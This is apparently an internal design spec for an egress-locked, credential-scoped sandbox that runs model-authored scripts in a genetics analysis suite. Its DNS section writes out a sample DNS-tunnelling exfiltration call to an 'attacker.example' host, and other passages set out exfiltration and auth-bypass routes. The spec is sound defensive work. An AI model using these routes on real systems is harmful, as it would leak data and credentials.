**Section 3(c) is met by its second branch, not its first.** "No `google-auth`-based
client in the image" was only ever true of the *Python distribution name*, which is not
the property the control needs. polars links `object_store`, a full Rust GCS/S3/Azure
client: in the built image `pl.scan_parquet("gs://…")` performs the metadata token
request itself, with no google-auth and no Python in the path, and the native object
contains `metadata.google.internal`, `169.254.169.254`, `computeMetadata`,
`GCE_METADATA_HOST` and `oauth2.googleapis.com`. Left alone that is a name resolution
inside a DNS-less pod — the multi-second stall 3(c) exists to prevent, measured at
**86.7s** for one `scan_parquet` against a blackholed resolver — and, in a pool that ever
runs in GCE_METADATA mode, a two-line token mint. The image therefore takes 3(c)'s named
fallback and sets `GCE_METADATA_HOST=169.254.169.254`. **Verified, not assumed**: with the
variable pointed at a listener on `127.0.0.1`, object_store sent it
`GET /computeMetadata/v1/instance/service-accounts/default/token?audience=…` — it honours
the variable, so the pin keeps the name out of the resolver. What the pin does *not* do is
confine anything: `pl.write_parquet("s3://…")` remains an exfiltration primitive
independent of httpx, and it is `4h6.8`'s NetworkPolicy that closes it. `build-checks.py`
now greps the venv's `.so` files for the metadata strings and fails unless the final stage
pins the variable to a literal IPv4, because the old check — grep for distribution names,
`import google.auth` — reported green while the capability sat compiled into Rust.

**The image does not build without the SDK, deliberately.** `4h6.11` has landed on
genetics-mcp-server's `worktree-db-only-architecture` branch but not on `master`, so a
default `build-all.sh` still finds no `src/genetics_mcp_server/sdk/` and skips the sandbox
with a loud message while the rest of the suite builds; `build.sh sandbox` fails hard,
because asking for that image by name and getting one without the SDK would be worse than
an error. Building against the branch that has it (`MCP_SERVER_BRANCH=…`) is what the
assertions above were verified against.

**The image does not build with `4h6.13`'s placeholders either, by the same reasoning.**
Shipping them degrades *silently*: `run_analysis` runs, the pod is healthy, and the model
reads a file telling it this is not the real schema. `build-checks.py` fails the build on
any `PLACEHOLDER*` file in the staged trees, which couples this image to `4h6.13` exactly
as the import assertion couples it to `4h6.11`. `4h6.13` has since landed and the
placeholders are gone — see "Schema docs and stubs" below.

**Interpreter pre-warming is split.** The image supplies `/genetics/prewarm.py` (the module
list and a `prewarm()` that imports it, **raising `PrewarmError`** on any failure rather
than returning the names — none of these modules is optional, and a supervisor that
ignored the return value would answer health checks while every plotting script failed
inside the child) and bakes the two costs that a fork cannot amortise:
`.pyc` for the whole venv (`compileall`; the root filesystem is read-only, so without this
every import in every execution recompiles) and the matplotlib font cache. The long-lived
supervisor that calls `prewarm()` before its first fork is `4h6.14`'s; the image has **no
`CMD`**, because a placeholder supervisor would be indistinguishable from a real one at
runtime. Cold import of the full stack measured **2.99s** in the built image — that is the
per-execution cost pre-warming removes.

**Hard contract for `4h6.14` on matplotlib, verified not assumed.** `MPLCONFIGDIR` pointing
at a read-only directory does **not** merely warn on matplotlib 3.10: with no writable
`/tmp` it raises `OSError: Matplotlib requires access to a writable cache directory`. So the
supervisor **must** copy `$GENETICS_MPLCACHE` (`/genetics/mplcache`, the baked font cache)
into a writable directory and point `MPLCONFIGDIR` there **before** importing matplotlib.
This is startup work, not per-execution work: the child inherits the imported font manager
through the fork, so the per-execution `MPLCONFIGDIR` under `/scratch/<id>` required by the
writable-paths row costs nothing.

**Environment the image sets**, all of it non-per-execution: `PYTHONPATH` (the venv's
site-packages — the venv's `bin/` is deleted in the builder stage, and its `python3` was a
symlink to the builder's interpreter), `GCE_METADATA_HOST=169.254.169.254` (section 3(c);
see "met by its second branch" above — this one is a security control, not a convenience,
and `build-checks.py` fails the build if it is removed while polars ships),
`PYTHONUNBUFFERED`, `PYTHONFAULTHANDLER`, `MPLBACKEND=Agg`, `GENETICS_MPLCACHE`,
`GENETICS_SCHEMA_DIR`, `GENETICS_STUBS_DIR`, `GENETICS_PREWARM`, and
`SANDBOX_SUPERVISOR_UID` / `SANDBOX_CHILD_UID` / `SANDBOX_SHARED_GID` (65532 / 65533 /
65532) so `4h6.7` and `4h6.14` read the uids rather than restating them. `TMPDIR`, `HOME`,
`MPLCONFIGDIR`, `XDG_CACHE_HOME` and `PYTHONPYCACHEPREFIX` are deliberately **not** set:
they are per-execution and belong under `/scratch/<execution-id>`, and a fixed value in the
image would recreate exactly the shared cross-execution directory that removing the
pod-level `/tmp` eliminated.

**Schema docs and stubs (`4h6.13`, landed).** `scripts/gen-sandbox-docs.py` writes schema
markdown into `sandbox/schema/` and `.pyi` signature stubs into `sandbox/stubs/`; the
Dockerfile copies those directories verbatim to `/genetics/schema/` and `/genetics/sdk/`
owned `65532:65532`, exported as `GENETICS_SCHEMA_DIR` and `GENETICS_STUBS_DIR`. **No
Dockerfile change was needed** — the contract `4h6.6` fixed held exactly as written. The
`PLACEHOLDER*` files are gone and neither directory is empty; `build-checks.py` still
fails the build on any `PLACEHOLDER*` file, so the coupling stays. `/genetics/sdk/` is
**not** on `PYTHONPATH` and must not be added to it — the importable SDK is the real
package in `/opt/venv`, and two copies of those names on `sys.path` would shadow silently;
the generated stubs say so in their own header.

Both trees are *generated, never transcribed*. The schema markdown is rendered from this
repo's canonical `configs/datasets.yaml` — one file per entry under `tables:`, carrying its
description, columns, enumerable columns and worked example SQL — and the stubs are read
out of the genetics SDK's source with `ast` (never imported: importing would execute
`genetics_mcp_server.config.settings`, and the build host has no polars or httpx). The
generator names no view and no SDK function; `scripts/test-sandbox-docs.py` asserts that,
asserts the three correctness rules `4h6.13` names are present *in `datasets.yaml`*, and
asserts that mutating those YAML fields moves the generated output. The reason is that a
transcribed rule has no runtime symptom: the image builds green while `/genetics/schema`
contradicts the canonical file, and `genetics-results-suite-5p5` is an open P1 that will
rewrite `credible_sets_v`'s variant/chr guidance. Both build scripts regenerate before
building, so the image can never document a schema older than the file it came from;
`build.sh sandbox` fails hard if generation fails, `build-all.sh` skips the sandbox loudly.
The generated files are also committed, so the directories are never empty and the diff of
a `datasets.yaml` change is visible in review.

**Image size is 607 MB.** numpy, scipy, matplotlib and polars are most of it. Noted because
the sandbox node pool is pinned at one node and pulls the image on every node replacement.

---

## 3. Egress policy

Today `k8s/network-policies/policies.yaml` contains **ingress rules only** — there is no
egress policy anywhere in the namespace. The sandbox introduces the first one, and it is
default-deny.

### Decisions

`k8s/network-policies/sandbox-policy.yaml`, selector `app: sandbox`.

**As built (`4h6.8`).** Two objects rather than one, following the namespace's
`allow-ingress-<target>` naming: `allow-ingress-sandbox` (`policyTypes: ["Ingress"]`) and
`sandbox-egress` (`policyTypes: ["Egress"]`). They union to the single
`["Ingress", "Egress"]` object specified above; splitting them keeps the file's names
consistent with the eight existing ingress policies. The file is applied by
`deploy.sh`'s existing `kubectl apply -f network-policies/`, which takes the whole
directory — no `deploy.sh` change was needed.

**Label contract, declared here and repeated at the top of the policy file and in the
`4h6.7` bead notes:** pod label `app: sandbox` on the Deployment's
`.spec.template.metadata.labels`, container port **8080/TCP**, Service named `sandbox`
(ClusterIP 8080 → targetPort 8080). NetworkPolicy `ports` are **pod** ports, not Service
ports. A podSelector that matches no pod is not an error — it is silent no-coverage, and
since this is the only egress policy in the namespace, a label mismatch in `4h6.7` yields a
sandbox with *unrestricted* egress and no signal anywhere.

**Egress — allow exactly two, deny everything else:**

| Destination | Port | Why |
|---|---|---|
| `podSelector: app: db-api` | 8080/TCP | The primary data path. |
| `podSelector: app: results-api` | 4000/TCP | Summary statistics, LD, fuzzy search — the things BigQuery cannot serve. |

**No kube-dns rule.** Name resolution is done with `hostAliases` instead — see "On DNS"
below. This is a change from an earlier draft, which allowed 53/UDP+TCP to
`kube-system`/`k8s-app: kube-dns` and booked DNS tunnelling as an accepted residual.

**Denied by omission, and each is load-bearing:**

- **The internet.** No `ipBlock` rule of any kind. A script cannot `pip install`, cannot
  fetch a mining payload, and cannot `POST` query results anywhere.
- **`chat-data`.** Not a network control — the PVC is simply not mounted (section 2). Named
  here because it is the asset the egress policy exists to protect.
- **keycloak and keycloak-postgres.** The identity broker and its database.
- **rag-service** and **chat-backend**. The sandbox is a leaf: it is called, it does not
  call back. Denying egress to chat-backend also means a script cannot re-enter the chat
  API with the caller's session.
- **mcp-server.** Denying this closes the obvious laundering route — a script that could
  reach mcp-server would inherit mcp-server's own permission through the
  `allow-ingress-db-api` policy and its full 60-tool surface.
- **`169.254.169.254`** (the GCE/GKE metadata server). **Amended by `4h6.8` — the original
  "covered by default-deny" is an over-claim and the policy must not be relied on here.**
  No rule permits it, so under standard NetworkPolicy semantics it is denied; but
  link-local / node-local traffic is exactly the class already proven **exempt** from
  NetworkPolicy on this dataplane in the ingress direction (kubelet probes from
  `169.254.4.6` reach pods whose policies list only podSelectors — this is the same
  observation that lets every other rule in the namespace skip a probe ipBlock). Whether
  Dataplane V2 enforces *egress* to a link-local address has not been tested on this
  cluster. Assume no coverage from the policy until it is; `genetics-results-suite-4h6.26`
  carries the test. What is actually load-bearing: the node pool runs in
  `GKE_METADATA` mode and the sandbox KSA has no
  Workload Identity binding, so even a policy-engine gap yields no usable GCP credential.
  Note precisely what does *not* help here — `automountServiceAccountToken: false` is a
  Kubernetes-API control and has no bearing on the metadata server, and Workload Identity
  bindings are irrelevant if the pool were ever created in `GCE_METADATA` mode. The
  metadata defence lives in the node pool spec (section 2), not in this policy.

**Ingress — allow exactly one:**

| Source | Port |
|---|---|
| `podSelector: app: chat-backend` | 8080/TCP |

Not the load balancer, not mcp-server, not the monitor. `k8s/network-policies/monitor-policy.yaml`
must **not** be extended to include the sandbox; liveness is the kubelet's job and kubelet
probes are not subject to NetworkPolicy.

### The other half of the egress path: db-api's ingress policy must be amended

**Without this edit the primary data path does not work at all.** A NetworkPolicy egress
allow on the sandbox side is necessary but not sufficient:
`k8s/network-policies/policies.yaml` declares a namespace-wide `default-deny-ingress`, and
`allow-ingress-db-api` currently admits only `app: chat-backend` and `app: mcp-server` on
8080. Every sandbox → db-api connection is therefore dropped at the *receiving* end no
matter what the sandbox's own policy says.

`4h6.8` adds

```yaml
- podSelector:
    matchLabels:
      app: sandbox
```

to the existing `from:` list of `allow-ingress-db-api`.

**Amended by `4h6.8`: the same edit is required on `allow-ingress-results-api`, and this
paragraph used to say the opposite.** The original text said "nothing else in that file
changes" and warned against copying `allow-ingress-results-api`, because at the time that
policy carried a rule with `- ports:` and **no `from:`** — which admits *all* sources, so
the sandbox would have reached results-api on 4000 without an explicit entry. That hole
was one half of `genetics-results-suite-fad` and it is now **closed**: `fad` and
`genetics-results-suite-k4t` between them scoped every from-less rule in the namespace, so
`allow-ingress-results-api` is now an explicit podSelector list (auth-gateway, bff,
chat-backend, mcp-server). The sandbox must therefore be added to it **explicitly**, or the
results-api half of the data path is dropped at the receiving end exactly like db-api's.
The original warning still stands in its general form: every rule added for the sandbox
carries an explicit `from:`, and `scripts/test-network-policies.py` asserts that none of
them is from-less.

**Both reverse-direction entries are reachability only; neither path returns data today.**
db-api 401s any request without `Authorization: Bearer $INTERNAL_API_SECRET`, and since
`fad` results-api returns 401 for a request carrying neither the trusted-proxy marker nor
a valid bearer (`REQUIRE_AUTH=true` in production; `get_verified_user` → `None` →
`auth_required` raises 401). The sandbox holds neither secret **by design**. So after
`4h6.8` the sandbox can open a TCP connection to both services and every request comes back
401 until `4h6.9` lands the scoped short-lived credential. That is the expected
intermediate state, not a regression — and the fix is `4h6.9`, never handing the sandbox
`INTERNAL_API_SECRET`.

### On DNS

**Decision: no DNS egress in v1. The sandbox resolves names from `hostAliases`.**

An earlier draft allowed kube-dns and booked DNS tunnelling as a low-bandwidth accepted
residual — "a few hundred bytes per query". That framing is wrong by three orders of
magnitude and it falsifies two claims this document makes elsewhere. A pod with egress to
CoreDNS can sustain on the order of 10³ queries/second; at roughly 200 usable base32 bytes
per query name that is **~200 KB/s, i.e. tens of megabytes inside the 120-second wall
clock**. That is not a side channel, it is a working egress pipe. It needs no POST and no
response — `socket.getaddrinfo(b32(chunk) + '.exfil.attacker.example')` is the whole
payload, and the resolver walks it upstream to the attacker's authoritative server for
free. It is also exactly how a stolen credential leaves the cluster: a GCP access token is
about 1 KB, five queries.

So the elimination becomes the default:

- No kube-dns rule in the sandbox egress policy.
- `hostAliases` on the sandbox pod pinning `db-api` and `results-api` to their ClusterIPs,
  which `deploy.sh` resolves and substitutes at deploy time. The sandbox resolves **exactly
  two names** — this is the whole reason the trade is cheap here and would not be cheap for
  any other pod in the namespace.
- ClusterIPs are stable for a Service's lifetime, so the pinning holds. The cost is a
  deploy-time coupling between the manifest and live cluster state: if a Service is deleted
  and recreated, the sandbox must be re-rendered and rolled. `deploy.sh` already generates
  manifests, so this is a known shape rather than a new one, and the failure mode is a
  connection error the model sees, not a silent wrong answer.

Eliminating DNS moves name resolution from a network service into libc configuration, and
libc configuration has four sharp edges. Each is a hard requirement on `4h6.7` and
`4h6.8`, not advice.

**(a) Pin all four name forms, and fix the URL form the SDK is given.** `hostAliases`
writes literal strings into `/etc/hosts`, and the glibc `files` NSS module does **no
search-domain expansion** — `db-api` in `/etc/hosts` does not answer a lookup for
`db-api.genetics.svc.cluster.local`. Every service URL in this suite is an FQDN:
`k8s/deployments/chat-backend.yaml` and `k8s/deployments/mcp-server.yaml` both use
`http://db-api.genetics.svc.cluster.local:8080`. So pinning the bare name alone breaks the
moment the sandbox is configured like every other service in the namespace. Each of the two
IPs gets **all four forms** as multiple `hostnames` under one entry:

```yaml
hostAliases:
  - ip: "${DB_API_CLUSTER_IP}"
    hostnames: ["db-api", "db-api.genetics", "db-api.genetics.svc", "db-api.genetics.svc.cluster.local"]
  - ip: "${RESULTS_API_CLUSTER_IP}"
    hostnames: ["results-api", "results-api.genetics", "results-api.genetics.svc", "results-api.genetics.svc.cluster.local"]
```

and the SDK is configured with the **FQDN** form —
`http://db-api.genetics.svc.cluster.local:8080` and
`http://results-api.genetics.svc.cluster.local:4000` — matching the rest of the suite. The
other three forms are pinned so that a URL copied from anywhere else still resolves rather
than falling through to a DNS lookup that cannot happen.

**(b) `/etc/nsswitch.conf` must be asserted at image build time. The whole decision rests
on it.** `hostAliases` only helps if glibc consults `files` before `dns`. When
`/etc/nsswitch.conf` is **absent**, glibc's compiled-in default for the hosts database is
`dns [!UNAVAIL=return] files` — **DNS first**. Combined with an egress policy that
**drops** 53/UDP rather than rejecting it, every lookup then stalls through the full
resolver timeout budget (roughly 5s × 2 attempts × 2 nameservers) before falling back to
`/etc/hosts`. Inside a 60-second wall clock that is crippling, and it is a **hang, not an
error** — precisely the failure shape this decision claims to have eliminated. It cannot be
repaired at runtime either: `readOnlyRootFilesystem: true`. Distroless images do ship an
`/etc/nsswitch.conf` containing `hosts: files dns`, but "do" is not a guarantee across base
image revisions. **`4h6.6` must assert at build time** that `/etc/nsswitch.conf` exists in
the final image and that its `hosts:` line lists `files` before `dns` — a build-stage check
that fails the build, plus a startup assertion in the supervisor as a cheap backstop.

**(c) Implicit resolutions must be eliminated, not merely denied.** Anything that reaches
`google.auth.default()` probes `metadata.google.internal` **by name**. With no DNS that is
the same multi-second stall as (b), not the fast failure the design assumes. `4h6.6`
therefore requires **either** that the sandbox image contains no `google-auth`-based client
at all (preferred — the SDK talks to db-api and results-api over plain HTTP and needs no
GCP client), **or**, if one is unavoidable as a transitive dependency, that
`GCE_METADATA_HOST` is set to a literal IP so the probe fails immediately against the
NetworkPolicy instead of stalling in the resolver. Two things this does *not* affect: TLS
(both destinations are plain HTTP, so there is no certificate hostname to reconcile with an
IP), and IPv6 (`/etc/hosts` entries yield A records only, and neither Service is
dual-stack).

**(d) `deploy.sh` must resolve the ClusterIPs after the Services exist, and validate the
result.** Three specific traps, all silent:

- **Bootstrap deadlock.** `deploy.sh` is `set -euo pipefail`. The natural place to put the
  `kubectl get svc` lookups is the "derive variables" block near the top — and there they
  abort the **first deploy to a fresh cluster**, before any manifest is applied, because the
  Services do not exist yet. The lookups must run **after** the Services are applied. The
  apply loop iterates `deployments/*.yaml` alphabetically with each Service defined inside
  its own deployment file, so resolving per-file inside that loop works: by the time
  `sandbox.yaml` is reached, `db-api.yaml` and `results-api.yaml` have been applied.
- **Silent literal passthrough.** The existing `envsubst` calls pass **explicit variable
  allow-lists**. A name omitted from that list is not substituted and not an error — the
  manifest ships with the literal string `${DB_API_CLUSTER_IP}` in the `ip:` field.
  `DB_API_CLUSTER_IP` and `RESULTS_API_CLUSTER_IP` must be added to the deployments
  `envsubst` allow-list.
- **Headless `None`.** `kubectl get svc ... -o jsonpath='{.spec.clusterIP}'` returns the
  literal string `None` for a headless Service, and `None` substitutes into the manifest
  perfectly cleanly. The resolved value must be **validated as a dotted quad** and the
  deploy aborted otherwise — not defaulted, not warned about.

**If this is ever reverted** — for instance because an SDK dependency turns out to need a
third name — the residual must be restated honestly at ~200 KB/s rather than "a few hundred
bytes", and section 6.2 control #1 and section 6.4 control #2 must both be rewritten,
because with DNS allowed there *is* a sink and the classic payload *does* have somewhere to
go. Reverting is a decision about accepting bulk exfiltration, not a convenience tweak.

---

## 4. Credentials

### The rule

**The sandbox never holds `INTERNAL_API_SECRET`.** That secret authenticates the *service*,
not the *request*; it does not expire; and a script that reads it can reach db-api and
results-api directly and forever, from anywhere those services are reachable. The
`_ALLOWED_ENV_KEYS` comment records that this exact secret already leaked into
model-authored scripts once.

Note also *why a network policy is not a sufficient substitute*. `docs/project-spec.md`
records, and `genetics-results-db/api/main.py` repeats in the `require_auth` docstring:

> The NetworkPolicy is not a boundary on its own: mcp-server is permitted through it and is
> itself reachable from outside, so anything that could drive mcp-server could reach
> BigQuery behind it.

The sandbox must not become a second instance of that shape. Its network position and its
credential must *both* be narrow.

### Decisions

**Minter:** chat-backend. It is the only caller of the sandbox, it already holds
`INTERNAL_API_SECRET`, and it is the only component that knows the authenticated end user
and the chat session.

**Form:** HS256 JWT, signed with a **new, dedicated** secret `SANDBOX_TOKEN_SIGNING_KEY`
(32 random bytes, `create-secrets.sh`), shared between chat-backend (mint) and
db-api/results-api (verify). Deliberately *not* `INTERNAL_API_SECRET`: separate key,
separate blast radius, independent rotation.

Chosen over an opaque token plus introspection because db-api is stateless and has no
store; introspection would require db-api to call chat-backend, which the NetworkPolicy
does not permit and which inverts the dependency direction. A JWT validates offline.

**Lifetime:** `exp = iat + 300` (5 minutes). The hard wall clock is 120s; the slack covers
a slow BigQuery job started at the last moment. Short enough that a captured token is worth
almost nothing.

**Clock skew, and why the ttl only covers half of it.** The 300s ttl absorbs skew in the
*past* direction — a verifier whose clock runs ahead of the minter's still sees `exp` in the
future, with minutes to spare. It does nothing in the *forward* direction: PyJWT ≥ 2.10
raises `ImmatureSignatureError` as soon as `iat > now`, so a verifier whose clock runs even a
fraction of a second behind the minter's rejects a freshly minted token outright, and the ttl
cannot help. The minter and the two verifiers are separate pods and the sandbox is headed for
a dedicated node pool (`4h6.10`), so they are not even guaranteed the same node clock. Both
verifiers therefore pass `leeway=5` to `jwt.decode`, which applies to `exp`, `nbf` and `iat`
alike. It does **not** loosen the 300s bound: the `MAX_TOKEN_AGE_SECONDS` check is separate
code, compares `iat` against `time.time()` directly, and stays exact.

**One token per audience.** chat-backend mints two per execution. A token captured from a
results-api request cannot be replayed at db-api.

**How the tokens reach the script — not pod environment variables.** An earlier draft said
chat-backend "injects them as two environment variables", which does not describe anything
that can happen: chat-backend cannot set environment variables on a pod that is already
running, and the only reading under which it *could* — env in the sandbox pod spec — turns
a 5-minute per-execution token into a static pod-lifetime credential and destroys the
entire lifetime property. The mechanism is:

1. The tokens travel in the **body of the POST** from chat-backend to the sandbox, minted
   fresh for that execution.
2. The supervisor places them in the **forked child's** environment (or file, below) and
   never in its own. The supervisor holds no credentials at any point (residual #7).
3. Preferred over the child's environment: a **mode-0600 file under `/scratch/<id>`** that
   the SDK reads once and unlinks. Reason: `/proc/<pid>/environ` is readable by any process
   with the same uid, and under option (b) of the pids row the supervisor and child share
   uid 65532 — so a second child, or any helper process the script spawns, can read the
   token out of a sibling's environment. A file that is read and unlinked closes the window
   to the interval before the SDK's first call; `/scratch/<id>` is per-execution and wiped
   regardless. **Under option (a) — a distinct child uid — mode 0600 alone makes the file
   unreadable by the child**, which is the process that needs it: the supervisor writes it
   and must then `chown` it to the child uid at mode `0400` *before* the fork. That, and the
   matching rule for artifacts written by the child and read by the supervisor, are in
   section 2's "Permission contract"; option (a) is not implementable without both.
4. Nothing about the tokens is written to the pod spec, to a ConfigMap, or to a Secret.

**Claims (all required, all validated):**

| Claim | Value | Purpose |
|---|---|---|
| `iss` | `"chat-backend"` | Rejects tokens minted by anything else. |
| `aud` | `"db-api"` or `"results-api"` | Prevents cross-service replay. |
| `sub` | authenticated user email (from `X-Goog-Authenticated-User-Email`) | Attribution to a person. |
| `sid` | chat session id | **Required.** Makes db-api's `endpoint_access` log lines attributable to a conversation, which is what turns the SDK-call instrumentation (`4h6.12`) into an answerable "what did that script actually read?". |
| `jti` | execution id (uuid4) | Same value as the `/scratch/<execution-id>` directory name, so logs join across chat-backend, the sandbox SDK instrumentation and db-api. |
| `iat`, `exp` | as above | |
| `scope` | `"query:views"` | A coarse capability string. **In v1 only its presence is checked** — it is a hook for later per-view narrowing, and is documented as such rather than implied to enforce anything today. |

**Validation in db-api — and this path must NOT inherit fail-open.**

`genetics-results-db/api/main.py` `require_auth` currently begins:

```python
if not INTERNAL_API_SECRET or request.url.path in _UNAUTHENTICATED_PATHS:
    return
```

with a startup `logger.warning` as the only signal. That is deliberate for the shared-secret
path (mid-rollout clusters keep serving) and it is *unacceptable* for the sandbox path,
because the sandbox is the one caller whose input is attacker-influenced. Concretely, for
`4h6.9`:

1. Restructure `require_auth` so a **sandbox-shaped bearer** is routed to the sandbox
   validator *before* the `if not INTERNAL_API_SECRET` early return can short-circuit it.
   The unset-secret branch must be unreachable for such a request.

   **Discriminate on the JOSE header, not on dots.** "Three dot-separated segments" is
   *not* the discriminator — it matches every RS256 Google Identity Token as well, and
   using it would 401 that entire class of caller (latent in db-api today only because
   db-api has no other JWT caller; immediately fatal in results-api, which does — see the
   results-api subsection). The rule: base64url-decode the first segment *unverified*,
   read `alg`, and route to the sandbox validator only when `alg == "HS256"` (optionally
   also requiring `iss == "chat-backend"`). Anything else continues down the pre-existing
   auth paths untouched.

   **Why reading an unverified header is safe here, and what an implementer must not
   conclude from it.** The header is used *only to select a validator*, never to configure
   one. Each branch pins its own algorithm independently of what the header claimed — the
   sandbox branch decodes with `algorithms=["HS256"]` and the signing key, the Google
   branch verifies against Google's RS256 certificates. A forged `alg` therefore changes
   which validator rejects the token, not whether it is rejected. This is *not* licence to
   pass the header's `alg` into the decoder, and not licence to trust `kid`, `iss` or any
   other header field for anything beyond routing.
2. A sandbox-shaped bearer (HS256) is validated **only** as a sandbox token. It must never
   fall through to the `hmac.compare_digest` shared-secret comparison — otherwise a
   malformed token degrades into "is this string equal to the secret", which is a downgrade
   path.
3. If `SANDBOX_TOKEN_SIGNING_KEY` is unset, every sandbox-shaped (HS256) bearer is rejected
   `401`. **Fail closed, with no warning-and-continue.** Non-HS256 bearers are unaffected.
4. Decode with an explicit `algorithms=["HS256"]` allow-list (the `alg: none` / RS256-HMAC-
   confusion footgun), explicit `audience=` matching this service, and
   `options={"require": ["iss", "aud", "sub", "sid", "jti", "iat", "exp"]}`. Reject `iat`
   more than 300s in the past.
5. Log `sid`, `sub` and `jti` on every request authorized this way, into the existing
   structured log line that feeds the `genetics_api_logs` sink — whose production table is
   `phewas-development.genetics_api_logs.stdout` (named after the log ID, not the service; the
   similarly named `genetics_api_logs.genetics_results_api` is a developer VM's test output).
   **Caveat: those three fields are not queryable in BigQuery today.** That table's
   `jsonPayload` schema has no `sid`, `sub` or `jti` column, because no sandbox-authorized
   request has ever reached the sink to grow it — there is no sandbox Deployment and
   `SANDBOX_ENABLED` is `"false"` on both services. Until one lands, sandbox attribution is
   readable in Cloud Logging and container stdout only, and any claim here about attributing an
   execution must be checked against the schema rather than assumed.
6. **db-api refuses to start** — `sys.exit(1)`, not a `logger.warning` — when the sandbox
   is deployed and `INTERNAL_API_SECRET` is unset. Rules 1-5 all fire on "a sandbox-shaped
   bearer", and **nothing in this design obliges the sandbox to send one**. A script that
   simply omits the `Authorization` header falls into `if not INTERNAL_API_SECRET: return`
   and is authorized — with no `sid`, `sub` or `jti` to attribute it to anyone, and,
   because the caps below are keyed on the token audience, *without* the byte and row caps
   as well. The fail-closed rules would be opt-in for the one caller they exist for.

   **Trigger on the sandbox being deployed, not on the signing key being present.** An
   earlier draft made rule 6 fire on `SANDBOX_TOKEN_SIGNING_KEY` being set. That leaves the
   both-unset case wide open: deploy db-api with *neither* `SANDBOX_TOKEN_SIGNING_KEY` nor
   `INTERNAL_API_SECRET` while the sandbox is running, and db-api boots fail-open and the
   sandbox reaches it by sending no `Authorization` header at all — exactly the hole rule 6
   exists to close. So the condition is a **separate required input**,
   `SANDBOX_ENABLED` (a boolean env var on db-api and results-api, set true by the same
   deploy that creates the sandbox Deployment): if `SANDBOX_ENABLED` is true and either
   `INTERNAL_API_SECRET` or `SANDBOX_TOKEN_SIGNING_KEY` is unset, `sys.exit(1)`. The
   configuration is then unbootable in *both* the key-set and the both-unset shapes.
7. **`SANDBOX_TOKEN_SIGNING_KEY` joins `deploy.sh`'s existing "check secrets exist" gate**,
   next to the secrets it already verifies before applying manifests. Rule 6 refuses to run
   the pair mis-configured; this stops the pair being *deployed* apart in the first place,
   so the failure surfaces at deploy time rather than as a crash-looping db-api.

**Implementation note for the caps, so they are not enforced in the wrong place.**
`genetics-results-db/api/main.py` declares `max_rows: int = Field(default=1000, le=MAX_ROWS)`
— a **class-level** Pydantic constraint, evaluated at model definition time and identical
for every request. It cannot vary per credential. So the per-credential row cap must be
enforced **in the handler**, after the principal is known, by clamping the validated
`max_rows` down; tightening the module-level `MAX_ROWS` would apply the sandbox default to
every caller in the process, including the relaxed ones.

**Caps are the default, not a penalty applied to sandbox tokens.** This inverts an earlier
draft, in which the sandbox's lower limits were keyed on the sandbox audience — meaning a
caller could obtain *looser* limits by presenting a *weaker* credential, or none at all.
The sandbox-audience limits are the **defaults for every request db-api serves**, relaxed
to the existing operator-configured values only for a request carrying a *verified*
non-sandbox credential. No credential, or an unverified one, gets the tight limits.

**"Verified non-sandbox credential" means different things on the two services, and
conflating them breaks results-api.** On **db-api** it is exactly one thing: a successful
`hmac.compare_digest` against `INTERNAL_API_SECRET`. db-api has no other caller and no
other auth path. On **results-api** that definition is wrong and would silently degrade
real users: `k8s/deployments/auth-gateway.yaml`'s `@api_bearer` location routes
programmatic clients **straight to results-api with their own Google id_token or per-user
chat API token and deliberately no shared secret**. Under an hmac-only rule those verified
humans would land on the tight sandbox defaults on the bulkiest endpoints in the suite —
summary-statistic ranges and LD. So on results-api the relax condition is **any
successfully verified non-sandbox principal**: the shared secret, a verified Google
id_token, or a verified per-user API token. The tight defaults apply to the sandbox
audience and to anything unverified.

**The numbers, and why the earlier ones were not caps.** db-api's existing defaults are
`MAX_ROWS = 100000` and `MAX_BYTES_BILLED = 100 GB`. The earlier "cap" of 50 GB per query
was therefore a factor of two on bytes and no change at all on rows, against a caller that
has 120 seconds in which to loop. For the sandbox audience:

| Limit | Value | Note |
|---|---|---|
| `maximum_bytes_billed` per query | 50 GB | Half the existing default. Bounds one query only — which is the point of the next row. |
| Aggregate bytes billed per `jti` | 200 GB | Four queries at the per-query ceiling. **The control the per-query cap is not.** A single-pod, 120-second, concurrency-1 token needs no shared state to enforce this: an in-process counter in db-api keyed on `jti`, with a bounded LRU so a flood of distinct `jti`s cannot grow it, is sufficient. Over budget → `429`, not a silent truncation. |
| Response rows | 25 000 | **db-api only.** A quarter of the existing default, and well above what any legitimate aggregation returns *to a script* — the script aggregates in-pod and returns 64 KiB to the model regardless (section 2). results-api carries **no** row cap; see "As shipped" below for why counting rows there cost more than it bought. |
| Response bytes per request | 16 MiB | **results-api only** (`SANDBOX_MAX_RESPONSE_BYTES`). Bounds one response, of **any** status — a non-2xx body is caller-controlled too, since FastAPI's 422 handler echoes the offending input. Which is the point of the next four rows. |
| Aggregate response bytes per `jti` | 1 GiB | **results-api only** (`SANDBOX_AGGREGATE_RESPONSE_BYTES_BUDGET`). 64 responses at the per-response cap, or ~8.5 MB/s sustained across the whole 120 second wall clock. Charged from bytes actually **sent**, so it agrees with the per-response cap's own buffer rather than re-measuring — and charged for every status, not only 2xx. |
| Requests per `jti` | 1000 | **results-api only** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`). The byte budget does not bound a loop of *small* responses, and every request costs a tabix seek or a GCS range read whatever its size. ~8 rps over 120 seconds. |
| Concurrent requests per `jti` | 4 | **results-api only** (`SANDBOX_MAX_CONCURRENT_REQUESTS`). The one limit here with a **memory** failure mode rather than a cost one: each in-flight capped request buffers up to 16 MiB. 4 × 16 MiB = 64 MiB. |
| Concurrent sandbox requests per pod | 8 | **results-api only** (`SANDBOX_MAX_CONCURRENT_REQUESTS_TOTAL`). Across all executions. Unreachable today, since the sandbox is `concurrency: 1` and the per-`jti` limit binds first; it exists so raising the sandbox's own concurrency cannot silently multiply this pod's peak buffer against its 8Gi limit. |

All are enforced server-side from the token, never requested by the caller, and a
script cannot widen them by asking. The db-api values are module constants; the results-api ones
are env-configurable, because results-api payload sizes vary by dataset and format in a way
BigQuery byte counts do not and an operator has to be able to move them without a rebuild.

**What the aggregate budget actually bounds — stated rather than left to be inferred.**
`jti` is the **execution** id, so 200 GB is a per-*execution* budget, not per session and
not per user. chat-backend mints a fresh `jti` for every `run_analysis` call, so the real
bound on a determined user is **200 GB × turns**, and nothing in this design caps the number
of turns. That is tolerable here for two measured reasons, not by assumption: concurrency is
1 with a queue, so executions serialize rather than multiply, and the measured peak is 23
chat turns/hour — an upper bound of roughly 4.6 TB/hour scanned *if every turn ran a script
that deliberately exhausted its budget*, which is visible in BigQuery billing and
attributable per `sub` and `sid` through the logging in control 3 of 6.2. If a per-session or
